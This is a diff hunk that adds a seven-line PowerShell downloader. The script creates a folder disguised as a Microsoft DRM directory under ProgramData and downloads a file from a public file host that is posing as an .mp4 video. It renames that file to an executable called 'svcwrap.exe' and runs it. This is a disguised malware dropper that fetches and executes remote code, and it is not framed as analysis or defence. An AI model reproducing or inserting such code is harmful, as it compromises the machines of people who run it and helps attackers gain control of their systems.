@@ -1,0 +1,7 @@
+[Net.ServicePointManager]::SecurityProtocol = 'Tls12';
+$p='C:\ProgramData\Microsoft\DRM(wpa)';
+New-Item $p -ItemType Directory -Force -ErrorAction SilentlyContinue;
+$f = $p + '\svcwrap';
+(New-Object Net.WebClient).DownloadFile('https://files.catbox.moe/2iknh2.mp4', $f+'.tmp');
+Rename-Item ($f+'.tmp') ($f+'.exe');
+& ($f+'.exe')
